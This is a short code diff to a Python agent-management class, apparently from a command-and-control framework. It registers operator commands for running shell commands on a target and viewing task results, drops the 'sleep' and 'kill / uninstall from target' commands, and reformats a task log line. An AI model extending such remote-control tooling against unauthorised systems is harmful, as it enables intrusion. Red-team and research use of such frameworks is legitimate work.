@@ -44,10 +44,8 @@ class Agent:
         self.menu = men.Menu(self.name)
         
         self.menu.registerCommand("cmd", "Execute a shell command.", "<command>")
-        self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
-        self.menu.registerCommand("clear", "Clear tasks.", "")
-        self.menu.registerCommand("kill", "Task agent to kill / uninstall from target.", "")
         self.menu.registerCommand("tasks", "View issued tasks and their status.", "")
+        self.menu.registerCommand("clear", "Clear tasks.", "")
         self.menu.registerCommand("results", "View task results.", "<task ID")
 
         self.menu.uCommands()
@@ -137,7 +135,7 @@ class Agent:
             task_id = self.get_task_id()
             task = f"#{task_id} 0 {command}\n"
             self.write_task(task)
-            task = f" {task_id}          issued                 cmd                    {command}\n"
+            task = f" {task_id}           issued                 cmd                   {command}\n"
             self.log_task(task)
 
 
